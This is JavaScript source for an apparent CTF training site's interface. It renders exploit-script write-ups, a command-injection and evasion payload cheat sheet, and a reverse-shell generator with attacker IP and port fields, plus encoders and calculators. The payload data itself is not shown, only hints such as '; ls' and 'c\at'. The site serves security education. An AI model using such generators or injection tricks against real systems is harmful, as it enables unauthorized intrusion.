          <div class="note" style="border-left-color:var(--green);margin:10px 0">
            <strong>🏆 Flag:</strong> <code style="color:var(--green);font-size:13px">${esc(w.flag)}</code>
          </div>

          <div style="margin:12px 0">
            <h4 style="font-family:var(--display);color:var(--cyan);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 4px">Scenario &amp; Challenge Environment</h4>
            <p style="color:#cbd5e1;line-height:1.7;margin:0">${esc(w.scenario)}</p>
          </div>

          <div class="note" style="margin:12px 0">
            <h4 style="font-family:var(--display);color:var(--amber);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 4px">Root Cause Analysis</h4>
            <p style="color:#cbd5e1;line-height:1.7;margin:0">${esc(w.root_cause)}</p>
          </div>

          <div style="margin:14px 0">
            <h4 style="font-family:var(--display);color:var(--cyan);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 6px">Step-by-Step Solving Methodology</h4>
            <ol style="color:#cbd5e1;padding-left:20px;line-height:1.8;margin:0">
              ${w.solve_methodology.map(s => `<li>${esc(s)}</li>`).join('')}
            </ol>
          </div>

          <div style="margin:14px 0">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
              <h4 style="font-family:var(--display);color:var(--green);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0">Full Executable Python Exploit Script</h4>
              <button class="btn outline copy-btn" data-copy-exploit="${esc(w.id)}" style="margin:0">Copy Script</button>
            </div>
            <pre style="max-height:340px;overflow:auto"><code id="code-${esc(w.id)}">${esc(w.exploit_script)}</code></pre>
          </div>

          <div class="note warn-note" style="margin-top:12px">
            <h4 style="font-family:var(--display);color:var(--amber);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 4px">Defensive Remediation &amp; Production Hardening</h4>
            <p style="color:#cbd5e1;line-height:1.7;margin:0">${esc(w.defense_remediation).replace(/\n/g, '<br>')}</p>
          </div>
        </article>
      `).join('') || '<div class="empty">No tournament writeups matched this query.</div>'}
    </div>
  ` : ''}

  ${(tab === 'all' || tab === 'cve') ? `
    <div class="section-head" style="margin-top:28px">
      <div>
        <div class="eyebrow">HISTORIC CASE STUDIES // ROOT-CAUSE ARCHIVE</div>
        <h2>Historic Vulnerabilities &amp; Exploitation Lessons</h2>
      </div>
    </div>
    <div class="grid cols-2">
      ${filteredCves.map(c => `
        <div class="card">
          <div class="card-top">
            <h3>${esc(c.title)}</h3>
            <span class="tag">${esc(c.domain)}</span>
          </div>
          <p style="margin-top:8px">${esc(c.lesson)}</p>
          <div class="note" style="margin-top:12px">
            <strong>Study angles:</strong> ${c.study.map(s => `<span class="tag" style="margin:2px 4px 2px 0;display:inline-block">${esc(s)}</span>`).join('')}
          </div>
          ${c.source ? `<a class="btn outline" href="${esc(c.source)}" target="_blank" rel="noopener" style="margin-top:10px;font-size:11px">Source →</a>` : ''}
        </div>
      `).join('')}
    </div>
  ` : ''}
  `;
}

function tricksHTML() {
  const isCadet = !isAdvancedRole();
  const allTricks = window.CTF_TRICKS_DATA || [];
  const tab = state.tricksTab || 'all';
  const query = (state.tricksQuery || '').trim().toLowerCase();

  const restrictedCategories = ['privesc', 'shells', 'transfers', 'polyglots', 'evasion'];

  // Filter out restricted categories for cadets
  const accessibleTricks = isCadet
    ? allTricks.filter(t => !restrictedCategories.includes(t.category))
    : allTricks;

  const filtered = accessibleTricks.filter(t => {
    const matchesTab = (tab === 'all') || (t.category === tab);
    if (!matchesTab) return false;
    if (!query) return true;
    const hay = `${t.title} ${t.categoryLabel} ${t.payload} ${t.context} ${t.why} ${t.internals} ${t.mitigation}`.toLowerCase();
    return hay.includes(query);
  });

  const allTabs = [
    ['all', 'All Tricks & Payloads'],
    ['chaining', 'Command Chaining (; && ||)'],
    ['whitespace', 'Whitespace Evasion ($IFS)'],
    ['obfuscation', 'Keyword Evasion (c\\at glob)'],
    ['evasion', 'WAF & Shell Evasion'],
    ['web', 'Web Injection'],
    ['polyglots', 'Web Polyglots & Bypasses'],
    ['privesc', 'SUID & GTFOBins Privesc'],
    ['linux-recon', 'Linux CTF Recon & Snooping'],
    ['transfers', 'File Transfers & Exfil'],
    ['shells', 'Interactive Shells & PTY']
  ];

  const visibleTabs = isCadet
    ? allTabs.filter(([catKey]) => !restrictedCategories.includes(catKey))
    : allTabs;

  return `
  <div class="section-head">
    <div>
      <div class="eyebrow">TACTICAL CHEAT SHEET // CTF PAYLOADS &amp; ESCAPES</div>
      <h2>Tricks, Payloads &amp; Command Injection Vault</h2>
      <p>Curated catalog of command separators, whitespace bypasses, keyword obfuscation, SUID exploits, and web injection techniques. Explains why each trick functions, its underlying OS/parser mechanics, and defensive mitigations.</p>
    </div>
    <div class="tag-row">
      <span class="tag accent">${filtered.length} active tricks</span>
      <span class="tag success">verified techniques</span>
      <span class="tag">mitigation included</span>
    </div>
  </div>

  <div class="module-search" style="margin-bottom:14px">
    <span>&gt;</span>
    <input id="tricksSearch" value="${esc(state.tricksQuery || '')}" placeholder="search tricks by payload (e.g. '; ls', '$IFS'), technique, or evasion context..." autocomplete="off">
    <span class="cursor">█</span>
  </div>

  <div class="os-tabs" style="margin-bottom:18px">
    ${visibleTabs.map(([catKey, label]) => `
      <button class="os-btn${tab === catKey ? ' active' : ''}" data-tricks-tab="${catKey}">${label}</button>
    `).join('')}
  </div>

  <div class="writeups-list">
    ${filtered.map(t => `
      <article class="writeup-card">
        <div class="card-top" style="align-items:flex-start">
          <div>
            <div class="tag-row" style="margin-bottom:6px">
              <span class="tag accent">${esc(t.categoryLabel.toUpperCase())}</span>
              <span class="tag">${esc(t.category)}</span>
            </div>
            <h3 style="font-size:18px;color:var(--fg);margin:0 0 6px">${esc(t.title)}</h3>
          </div>
          <button class="btn outline copy-btn" data-copy-trick="${esc(t.id)}">📋 Copy Payload</button>
        </div>

        <div style="margin:12px 0 16px">
          <pre style="margin:0;font-size:13px;border-color:var(--green)"><code>${esc(t.payload)}</code></pre>
        </div>

        <div class="cmd-table-wrap">
          <table class="cmd-table">
            <thead>
              <tr>
                <th style="width:25%">Property</th>
                <th>Tactical Analysis &amp; Mechanism</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td><strong>Context of Use</strong></td>
                <td>${esc(t.context)}</td>
              </tr>
              <tr>
                <td><strong>Why It Works</strong></td>
                <td>${esc(t.why)}</td>
              </tr>
              <tr>
                <td><strong>Engine / OS Internals</strong></td>
                <td>${esc(t.internals)}</td>
              </tr>
              <tr>
                <td><strong>Mitigation &amp; Defense</strong></td>
                <td><span style="color:var(--green)">${esc(t.mitigation)}</span></td>
              </tr>
            </tbody>
          </table>
        </div>
      </article>
    `).join('')}
  </div>`;
}

function workbenchHTML() {
  const tab = state.workbenchTab || 'encoder';
  return `
  <div class="section-head">
    <div>
      <div class="eyebrow">INTERACTIVE CTF ARSENAL // BROWSER-NATIVE WORKBENCH</div>
      <h2>Cyber Workbench &amp; Payload Studio</h2>
      <p>Zero-backend client-side utilities for CTF players, security researchers, and students: multi-format encoders/decoders, reverse shell generators with live IP/port binding, POSIX/SUID permission calculators, and IPv4 CIDR subnet calculators.</p>
    </div>
    <div class="tag-row">
      <span class="tag accent">100% Client-Side</span>
      <span class="tag success">Instant Math</span>
      <span class="tag warn">Lab Scope Only</span>
    </div>
  </div>

  <div class="os-tabs" style="margin-bottom:20px">
    <button class="os-btn${tab === 'encoder' ? ' active' : ''}" data-workbench-tab="encoder">🔤 Multi-Format Encoder / Decoder</button>
    <button class="os-btn${tab === 'shells' ? ' active' : ''}" data-workbench-tab="shells">🐚 Reverse Shell &amp; Payload Studio</button>
    <button class="os-btn${tab === 'permissions' ? ' active' : ''}" data-workbench-tab="permissions">🛡️ SUID &amp; POSIX Permission Math</button>
    <button class="os-btn${tab === 'subnets' ? ' active' : ''}" data-workbench-tab="subnets">🌐 IPv4 Subnet &amp; CIDR Calculator</button>
  </div>

  <div class="workbench-body">
    ${tab === 'encoder' ? renderWorkbenchEncoder() : ''}
    ${tab === 'shells' ? renderWorkbenchShells() : ''}
    ${tab === 'permissions' ? renderWorkbenchPermissions() : ''}
    ${tab === 'subnets' ? renderWorkbenchSubnets() : ''}
  </div>
  `;
}

function renderWorkbenchEncoder() {
  return `
  <div class="card" style="padding:24px">
    <div class="card-top" style="margin-bottom:16px">
      <div>
        <h3 style="color:var(--cyan);margin:0 0 4px">Multi-Format Encoding &amp; Cryptographic Studio</h3>
        <p style="color:#aeb6c5;font-size:13px;margin:0">Transform text and byte streams across Base64, Hexadecimal, URL-encoding, ROT13, 8-bit Binary, and SHA-256 digests in real-time.</p>
      </div>
      <button class="btn outline" id="clearEncoderBtn" style="font-size:11px">Clear All</button>
    </div>

    <div style="margin-bottom:14px">
      <label style="display:block;font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--fg);margin-bottom:6px">// INPUT TEXT OR BYTES</label>
      <textarea id="encoderInput" placeholder="Enter text, string, or payload to encode/decode..." style="width:100%;min-height:90px;background:#090d16;color:#e2e8f0;border:1px solid #1e293b;border-radius:4px;padding:12px;font-family:var(--mono);font-size:13px;resize:vertical" autocomplete="off"></textarea>
    </div>

    <div style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:14px">
      <button class="btn" id="btnB64Enc">Base64 Enc</button>
      <button class="btn outline" id="btnB64Dec">Base64 Dec</button>
      <button class="btn" id="btnHexEnc">Hex Enc</button>
      <button class="btn outline" id="btnHexDec">Hex Dec</button>
      <button class="btn" id="btnUrlEnc">URL Enc</button>
      <button class="btn outline" id="btnUrlDec">URL Dec</button>
      <button class="btn" id="btnRot13">ROT13</button>
      <button class="btn" id="btnBinEnc">Binary (8-bit)</button>
      <button class="btn outline" id="btnBinDec">Binary → Text</button>
      <button class="btn outline" id="btnSha256">SHA-256</button>
      <button class="btn outline" id="btnReverse">Reverse</button>
    </div>

    <div id="encoderFeedback" style="font-size:12px;color:var(--amber);margin-bottom:10px;min-height:16px"></div>

    <div style="margin-bottom:10px">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
        <label style="font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--green)">// OUTPUT RESULT</label>
        <button class="btn outline" id="copyEncoderOutputBtn" style="font-size:11px">📋 Copy Output</button>
      </div>
      <textarea id="encoderOutput" readonly placeholder="Output will appear here..." style="width:100%;min-height:90px;background:#06090e;color:#00ff88;border:1px solid #1e293b;border-radius:4px;padding:12px;font-family:var(--mono);font-size:13px;resize:vertical"></textarea>
    </div>
  </div>
  `;
}

function renderWorkbenchShells() {
  const lhost = state.workbenchLhost || '10.10.14.42';
  const lport = state.workbenchLport || '4444';
  const shells = getShellsList(lhost, lport);
  return `
  <div class="card" style="padding:24px;margin-bottom:20px">
    <div class="card-top" style="margin-bottom:16px">
      <div>
        <h3 style="color:var(--amber);margin:0 0 4px">Reverse Shell &amp; Listener Studio</h3>
        <p style="color:#aeb6c5;font-size:13px;margin:0">Dynamically binds your target listening IP and port across multiple shell idioms and terminal stabilizers. Strictly for lab targets you control.</p>
      </div>
      <span class="tag warn">Authorized Labs Only</span>
    </div>

    <div class="grid cols-2" style="gap:16px;margin-bottom:20px">
      <div>
        <label style="display:block;font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--cyan);margin-bottom:4px">LHOST (Your Attacker / VPN IP):</label>
        <input type="text" id="workbenchLhost" value="${esc(lhost)}" placeholder="e.g. 10.10.14.42 or tun0 IP" style="width:100%;background:#090d16;color:#e2e8f0;border:1px solid #1e293b;border-radius:4px;padding:8px 12px;font-family:var(--mono);font-size:13px" autocomplete="off">
      </div>
      <div>
        <label style="display:block;font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--cyan);margin-bottom:4px">LPORT (Your Listener Port):</label>
        <input type="number" id="workbenchLport" value="${esc(lport)}" placeholder="e.g. 4444, 9001" style="width:100%;background:#090d16;color:#e2e8f0;border:1px solid #1e293b;border-radius:4px;padding:8px 12px;font-family:var(--mono);font-size:13px" autocomplete="off">
      </div>
    </div>

    <div class="writeups-list" id="shellsList">
      ${shells.map(sh => `
        <article class="writeup-card" style="margin-bottom:14px">
          <div class="card-top" style="align-items:flex-start">
            <div>
              <div class="tag-row" style="margin-bottom:4px">
                <span class="tag accent">${esc(sh.cat.toUpperCase())}</span>
              </div>
              <h4 style="font-size:16px;color:var(--fg);margin:0">${esc(sh.name)}</h4>
            </div>
            <button class="btn outline copy-btn" data-copy-shell="${esc(sh.id)}">📋 Copy Command</button>
          </div>
          <p style="color:#aeb6c5;font-size:13px;line-height:1.6;margin:8px 0 10px">${esc(sh.desc)}</p>
          <pre class="code-block" style="background:#090d16;padding:12px;border:1px solid #1e293b;border-radius:4px;overflow-x:auto"><code id="shell-code-${esc(sh.id)}" style="color:#00ff88;font-size:13px;font-family:var(--mono)">${esc(sh.cmd)}</code></pre>
        </article>
      `).join('')}
    </div>
  </div>
  `;
}

function renderWorkbenchPermissions() {
  return `
  <div class="card" style="padding:24px">
    <div class="card-top" style="margin-bottom:16px">
      <div>
        <h3 style="color:var(--cyan);margin:0 0 4px">POSIX &amp; SUID Permission Calculator</h3>
        <p style="color:#aeb6c5;font-size:13px;margin:0">Convert between Octal mode bits and Symbolic permission strings. Evaluates privilege escalation risk for SetUID, SetGID, and sticky bits.</p>
      </div>
      <span class="tag accent">Linux OS Internals</span>
    </div>

    <div style="display:flex;flex-wrap:wrap;gap:16px;align-items:center;margin-bottom:20px">
      <div>
        <label style="display:block;font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--fg);margin-bottom:4px">OCTAL MODE:</label>
        <input type="text" id="permOctal" value="4755" maxlength="4" style="width:120px;font-size:18px;font-weight:bold;color:#00ff88;background:#090d16;border:1px solid #1e293b;border-radius:4px;padding:6px 12px;font-family:var(--mono);text-align:center" autocomplete="off">
      </div>
      <div>
        <label style="display:block;font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--fg);margin-bottom:4px">SYMBOLIC STRING:</label>
        <div id="permSymbolic" style="font-size:18px;font-family:var(--mono);font-weight:bold;color:var(--cyan);background:#090d16;border:1px solid #1e293b;border-radius:4px;padding:6px 16px">-rwsr-xr-x</div>
      </div>
      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:flex-end">
        <button class="btn outline perm-preset" data-preset="4755" style="font-size:11px">4755 (SUID Root)</button>
        <button class="btn outline perm-preset" data-preset="0755" style="font-size:11px">0755 (Binary)</button>
        <button class="btn outline perm-preset" data-preset="0644" style="font-size:11px">0644 (Standard File)</button>
        <button class="btn outline perm-preset" data-preset="0777" style="font-size:11px">0777 (World Writable)</button>
        <button class="btn outline perm-preset" data-preset="1777" style="font-size:11px">1777 (/tmp Sticky)</button>
      </div>
    </div>

    <div style="background:#090d16;border:1px solid #1e293b;border-radius:6px;padding:16px;margin-bottom:20px;overflow-x:auto">
      <table style="width:100%;border-collapse:collapse;text-align:center;font-size:13px">
        <thead>
          <tr style="border-bottom:1px solid #1e293b;color:var(--muted)">
            <th style="padding:8px;text-align:left">CATEGORY</th>
            <th style="padding:8px">READ (4)</th>
            <th style="padding:8px">WRITE (2)</th>
            <th style="padding:8px">EXECUTE (1)</th>
            <th style="padding:8px">SPECIAL BIT</th>
          </tr>
        </thead>
        <tbody>
          <tr style="border-bottom:1px dashed #1e293b">
            <td style="padding:10px;text-align:left;color:var(--fg);font-weight:bold">Owner (User)</td>
            <td style="padding:10px"><input type="checkbox" id="chkUr" checked></td>
            <td style="padding:10px"><input type="checkbox" id="chkUw" checked></td>
            <td style="padding:10px"><input type="checkbox" id="chkUx" checked></td>
            <td style="padding:10px"><label style="font-size:11px;color:var(--amber)"><input type="checkbox" id="chkSuid" checked> SetUID (4000)</label></td>
          </tr>
          <tr style="border-bottom:1px dashed #1e293b">
            <td style="padding:10px;text-align:left;color:var(--fg);font-weight:bold">Group</td>
            <td style="padding:10px"><input type="checkbox" id="chkGr" checked></td>
            <td style="padding:10px"><input type="checkbox" id="chkGw"></td>
            <td style="padding:10px"><input type="checkbox" id="chkGx" checked></td>
            <td style="padding:10px"><label style="font-size:11px;color:var(--cyan)"><input type="checkbox" id="chkSgid"> SetGID (2000)</label></td>
          </tr>
          <tr>
            <td style="padding:10px;text-align:left;color:var(--fg);font-weight:bold">Other (World)</td>
            <td style="padding:10px"><input type="checkbox" id="chkOr" checked></td>
            <td style="padding:10px"><input type="checkbox" id="chkOw"></td>
            <td style="padding:10px"><input type="checkbox" id="chkOx" checked></td>
            <td style="padding:10px"><label style="font-size:11px;color:var(--green)"><input type="checkbox" id="chkSticky"> Sticky Bit (1000)</label></td>
          </tr>
        </tbody>
      </table>
    </div>

    <div class="note" id="permRiskBox" style="border-left-color:var(--amber)">
      <h4 style="font-family:var(--display);color:var(--amber);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 4px">Security &amp; Privilege Escalation Assessment</h4>
      <p id="permRiskText" style="color:#cbd5e1;line-height:1.7;margin:0">⚠️ CRITICAL PRIVILEGE ESCALATION RISK: SUID (Set User ID) is active. When executed by any unprivileged user, this binary runs with the file owner's privileges (typically root). If this binary is cataloged in GTFOBins, root privilege escalation is immediate.</p>
    </div>
  </div>
  `;
}

function renderWorkbenchSubnets() {
  const ip = state.workbenchSubnetIp || '10.10.14.23';
  const prefix = state.workbenchSubnetPrefix || '24';
  const res = calculateSubnet(ip, prefix);
  return `
  <div class="card" style="padding:24px">
    <div class="card-top" style="margin-bottom:16px">
      <div>
        <h3 style="color:var(--cyan);margin:0 0 4px">IPv4 Subnet &amp; CIDR Range Calculator</h3>
        <p style="color:#aeb6c5;font-size:13px;margin:0">Calculate network boundaries, broadcast addresses, usable host spans, and wildcard masks instantly for CTF target networks and lab scopes.</p>
      </div>
      <span class="tag success">Network Architecture</span>
    </div>

    <div class="grid cols-2" style="gap:16px;margin-bottom:20px">
      <div>
        <label style="display:block;font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--fg);margin-bottom:4px">IPv4 HOST / NETWORK IP:</label>
        <input type="text" id="subnetIp" value="${esc(ip)}" placeholder="e.g. 10.10.14.23" style="width:100%;background:#090d16;color:#e2e8f0;border:1px solid #1e293b;border-radius:4px;padding:8px 12px;font-family:var(--mono);font-size:13px" autocomplete="off">
      </div>
      <div>
        <label style="display:block;font-size:12px;font-family:var(--display);letter-spacing:.08em;color:var(--fg);margin-bottom:4px">CIDR PREFIX MASK (/BITS):</label>
        <select id="subnetPrefix" style="width:100%;background:#090d16;color:#e2e8f0;border:1px solid #1e293b;border-radius:4px;padding:8px 12px;font-family:var(--mono);font-size:13px">
          ${[8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32].map(n => `
            <option value="${n}" ${String(n) === String(prefix) ? 'selected' : ''}>/${n} - Mask: ${getNetmaskFromPrefix(n)}</option>
          `).join('')}
        </select>
      </div>
    </div>

    <div id="subnetResults" style="background:#090d16;border:1px solid #1e293b;border-radius:6px;padding:20px">
      ${res.valid ? `
        <div class="grid cols-2" style="gap:14px;font-size:13px">
          <div><span style="color:var(--muted)">Network Address:</span> <strong style="color:var(--cyan);font-family:var(--mono)">${esc(res.network)}</strong></div>
          <div><span style="color:var(--muted)">Broadcast Address:</span> <strong style="color:var(--cyan);font-family:var(--mono)">${esc(res.broadcast)}</strong></div>
          <div><span style="color:var(--muted)">Subnet Mask:</span> <strong style="color:var(--green);font-family:var(--mono)">${esc(res.netmask)}</strong></div>
          <div><span style="color:var(--muted)">Wildcard Mask:</span> <strong style="color:var(--amber);font-family:var(--mono)">${esc(res.wildcard)}</strong></div>
          <div><span style="color:var(--muted)">Usable Host Range:</span> <strong style="color:#e2e8f0;font-family:var(--mono)">${esc(res.hostRange)}</strong></div>
          <div><span style="color:var(--muted)">Total Usable Hosts:</span> <strong style="color:var(--green);font-family:var(--mono)">${esc(res.hosts)}</strong></div>
          <div style="grid-column:span 2"><span style="color:var(--muted)">Scope / Class:</span> <strong style="color:var(--accent);font-family:var(--mono)">${esc(res.scope)}</strong></div>
        </div>
      ` : `<div style="color:var(--pink)">${esc(res.error)}</div>`}
    </div>
  </div>
  `;
}

function libraryHTML() {
  const refs = [
    {title:'Official Documentation',items:[{name:'Linux man-pages project',desc:'Authoritative reference for system calls, library functions and file formats.',url:'https://man7.org/linux/man-pages/'},{name:'POSIX.1-2017',desc:'IEEE/Open Group standard for POSIX-compliant operating systems.',url:'https://pubs.opengroup.org/onlinepubs/9699919799/'},{name:'RFC Index',desc:'IETF Internet standards. Start with RFC 791 (IP), 793 (TCP), 7230 (HTTP/1.1).',url:'https://www.rfc-editor.org/rfc-index.html'},{name:'Intel x86/x64 ISA',desc:'Complete instruction set reference. Essential for assembly reading and ROP.',url:'https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html'}]},
    {title:'Practice Platforms',items:[{name:'pwn.college',desc:'Structured pwn and RE curriculum with kernel-isolated online containers.',url:'https://pwn.college/'},{name:'CryptoHack',desc:'Hands-on cryptography challenges from basic encodings to advanced attacks.',url:'https://cryptohack.org/'},{name:'PortSwigger Web Academy',desc:'Free web security labs from the Burp Suite team. Industry standard.',url:'https://portswigger.net/web-security'},{name:'HackTheBox',desc:'Machine-based CTF with community writeups after each machine retires.',url:'https://www.hackthebox.com/'}]},
    {title:'Security References',items:[{name:'GTFOBins',desc:'Unix binaries exploitable for privilege escalation or restriction bypass.',url:'https://gtfobins.github.io/'},{name:'MITRE ATT&CK',desc:'Adversary tactics and techniques knowledge base. Essential for detection mapping.',url:'https://attack.mitre.org/'},{name:'OWASP Top 10',desc:'Ten most critical web application security risks with evidence and remediation.',url:'https://owasp.org/Top10/'},{name:'NIST NVD',desc:'National Vulnerability Database with CVE details, CVSS scores and patches.',url:'https://nvd.nist.gov/'}]}
  ];
  return `<div class="section-head"><div><h2>Reference vault</h2><p>Curated links to official documentation, practice platforms and security standards.</p></div></div>
  ${refs.map(g=>`<div class="ref-block card" style="margin-bottom:14px"><div class="card-top"><h3>${g.title}</h3></div><div class="ref-list">${g.items.map(it=>`<div class="ref-item"><div><strong>${esc(it.name)}</strong><p>${esc(it.desc)}</p></div>${it.url?`<a href="${esc(it.url)}" target="_blank" rel="noopener" class="btn outline" style="font-size:11px;align-self:start">Open →</a>`:''}</div>`).join('')}</div></div>`).join('')}`;
}

function glossaryHTML(filter) {
  const q = normalizeAnswer(filter);
  const hits = glossary.filter(([t, d]) => !q || normalizeAnswer(t + ' ' + d).includes(q));
  return `<div class="section-head"><div><h2>Glossary</h2><p>Precise definitions for terms used across all domains. Exact vocabulary reduces reasoning errors.</p></div></div>
  <div class="glossary-search"><input id="glossarySearch" value="${esc(filter||'')}" placeholder="filter terms…" autocomplete="off"></div>
  <div style="margin-top:16px">${hits.map(([t,d])=>`<div class="glossary-item"><strong>${esc(t)}</strong><span>${esc(d)}</span></div>`).join('') || '<div class="empty">No terms matched.</div>'}</div>`;
}

/* ── Event binding ───────────────────────────────────────── */
function bindViewEvents() {
  const view = document.getElementById('view');

  /* Navigation buttons */
  view.querySelectorAll('[data-action]').forEach(btn => {
    btn.addEventListener('click', () => {
      const a = btn.dataset.action;
      if (a === 'goto-path')        setView('path');
      if (a === 'goto-labs')        setView('labs');
      if (a === 'goto-domains')     setView('domains');
      if (a === 'goto-curriculum')  setView('curriculum');
      if (a === 'goto-tricks')      setView('tricks');
      if (a === 'goto-workbench')   setView('workbench');
      if (a === 'back-to-curriculum') { state.curriculumModule = null; setView('curriculum'); }
      if (a === 'complete-domain')  markDomain(btn.dataset.domainId);
    });
  });

  /* Domain cards */
  view.querySelectorAll('[data-domain]').forEach(btn => {
    btn.addEventListener('click', () => openDomain(btn.dataset.domain));
  });

  /* Curriculum module cards */
  view.querySelectorAll('[data-curriculum-module]').forEach(btn => {
    btn.addEventListener('click', () => {
      state.curriculumModule = btn.dataset.curriculumModule;
      render();
      window.scrollTo({ top: 0, behavior: 'smooth' });
    });
  });

  /* OS selector */
  /* Tool Academy tabs */
  view.querySelectorAll('[data-tool-tab]').forEach(btn => {
    btn.addEventListener('click', () => {
      state.toolTab = btn.dataset.toolTab;
      render();
    });
  });

  /* Playbook lifecycle tabs */
  view.querySelectorAll('[data-playbook-tab]').forEach(btn => {
    btn.addEventListener('click', () => {
      state.playbookTab = btn.dataset.playbookTab;
      render();
    });
  });

  /* OS selector */
  view.querySelectorAll('[data-os]').forEach(btn => {
    btn.addEventListener('click', () => {
      state.os = btn.dataset.os;
      save();
      render();
    });
  });

  /* Module search */
  const ms = view.querySelector('#moduleSearch');
  if (ms) {
    ms.addEventListener('input', () => {
      state.moduleQuery = ms.value;
      save();
      view.querySelector('#modulesGrid').innerHTML =
        (() => {
          const q = normalizeAnswer(ms.value);
          const rows = [];
          domains.forEach(d => d.concepts.forEach((c, i) => rows.push({ d, index: i+1, title: c[0], theory: c[1], practice: c[2], domain: d })));
          const hits = rows.filter(r => !q || normalizeAnswer(r.title + ' ' + r.theory + ' ' + r.practice + ' ' + r.domain.name).includes(q));
          return hits.map(r => {
            const chId = getChapterForConcept(r.domain.id, r.index, r.title);
            return `<article class="card module-card">
              <div class="module-top"><span class="tag accent">${r.domain.icon} / ${r.domain.name}</span><span class="tag">M${String(r.index).padStart(2,'0')}</span></div>
              <h3>${esc(r.title)}</h3>
              <p>${esc(r.theory)}</p>
              <div class="module-action"><span class="tag">practice</span><span>${esc(r.practice)}</span></div>
              <div style="display:flex;gap:8px;margin-top:12px;flex-wrap:wrap">
                <button class="btn" data-textbook="${chId}">📖 Read Textbook</button>
                <button class="btn outline" data-domain="${r.domain.id}">Full Path →</button>
              </div>
            </article>`;
          }).join('') || '<div class="empty">No modules matched.</div>';
        })();
      view.querySelectorAll('[data-domain]').forEach(b => b.addEventListener('click', () => openDomain(b.dataset.domain)));
      view.querySelectorAll('[data-textbook]').forEach(b => b.addEventListener('click', () => openTextbookModal(b.dataset.textbook)));
    });
    ms.focus();
  }

  /* Textbook modal buttons */
  view.querySelectorAll('[data-textbook]').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      openTextbookModal(btn.dataset.textbook);
    });
  });

  /* Copy exploit buttons */
  view.querySelectorAll('[data-copy-exploit]').forEach(btn => {
    btn.addEventListener('click', async (e) => {
      e.stopPropagation();
      const id = btn.dataset.copyExploit;
      const codeEl = view.querySelector(`#code-${id}`);
      if (codeEl) {
        try {
          await navigator.clipboard.writeText(codeEl.textContent);
          const orig = btn.textContent;
          btn.textContent = '✓ Copied!';
          setTimeout(() => { btn.textContent = orig; }, 2000);
        } catch (err) {
          btn.textContent = 'Copied';
        }
      }
    });
  });

  /* Casebook tabs */
  view.querySelectorAll('[data-casebook-tab]').forEach(btn => {
    btn.addEventListener('click', () => {
      state.casebookTab = btn.dataset.casebookTab;
      render();
    });
  });

  /* TCS HackQuest Season & Round filters */
  view.querySelectorAll('[data-hq-season]').forEach(btn => {
    btn.addEventListener('click', () => {
      state.hackquestSeasonFilter = btn.dataset.hqSeason;
      render();
    });
  });
  view.querySelectorAll('[data-hq-round]').forEach(btn => {
    btn.addEventListener('click', () => {
      state.hackquestRoundFilter = btn.dataset.hqRound;
      render();
    });
  });

  /* Casebook search */
  const cs = view.querySelector('#casebookSearch');
  if (cs) {
    cs.addEventListener('input', () => {
      state.casebookQuery = cs.value;
      render();
      const newCs = document.getElementById('casebookSearch');
      if (newCs) {
        newCs.focus();
        newCs.selectionStart = newCs.selectionEnd = newCs.value.length;
      }
    });
  }

  /* Tricks & Tips tabs */
  view.querySelectorAll('[data-tricks-tab]').forEach(btn => {
    btn.addEventListener('click', () => {
      state.tricksTab = btn.dataset.tricksTab;
      render();
    });
  });

  /* Tricks & Tips search */
  const ts = view.querySelector('#tricksSearch');
  if (ts) {
    ts.addEventListener('input', () => {
      state.tricksQuery = ts.value;
      render();
      const newTs = document.getElementById('tricksSearch');
      if (newTs) {
        newTs.focus();
        newTs.selectionStart = newTs.selectionEnd = newTs.value.length;
      }
    });
  }

  /* Copy trick payload */
  view.querySelectorAll('[data-copy-trick]').forEach(btn => {
    btn.addEventListener('click', async (e) => {
      e.stopPropagation();
      const id = btn.dataset.copyTrick;
      const allTricks = window.CTF_TRICKS_DATA || [];
      const tr = allTricks.find(x => x.id === id);
      const codeEl = view.querySelector(`#trick-code-${id}`);
      const textToCopy = (tr && (tr.copyText || tr.payload)) || (codeEl ? codeEl.textContent : '');
      if (textToCopy) {
        try {
          await navigator.clipboard.writeText(textToCopy);
          const orig = btn.textContent;
          btn.textContent = '✓ Copied!';
          setTimeout(() => { btn.textContent = orig; }, 2000);
        } catch (err) {
          btn.textContent = 'Copied';
        }
      }
    });
  });

  /* Live Intel tabs */
  view.querySelectorAll('[data-intel-tab]').forEach(btn => {
    btn.addEventListener('click', () => {
      state.intelTab = btn.dataset.intelTab;
      render();
    });
  });

  /* Live Intel search */
  const intelSearch = view.querySelector('#intelSearch');
  if (intelSearch) {
    intelSearch.addEventListener('input', () => {
      state.intelQuery = intelSearch.value;
      render();
      const newIs = document.getElementById('intelSearch');
      if (newIs) {
        newIs.focus();
        newIs.selectionStart = newIs.selectionEnd = newIs.value.length;
      }
    });
  }

  /* Live Intel threat dossier modal buttons */
  view.querySelectorAll('[data-open-intel]').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      openIntelModal(btn.dataset.openIntel);
    });
  });

  /* Workbench tabs */
  view.querySelectorAll('[data-workbench-tab]').forEach(btn => {
    btn.addEventListener('click', () => {
      state.workbenchTab = btn.dataset.workbenchTab;
      render();
    });
  });

  /* Workbench: Encoder Studio */
  const encInp = view.querySelector('#encoderInput');
  const encOut = view.querySelector('#encoderOutput');
  const encFbk = view.querySelector('#encoderFeedback');

  const setEncOutput = (text, err = '') => {
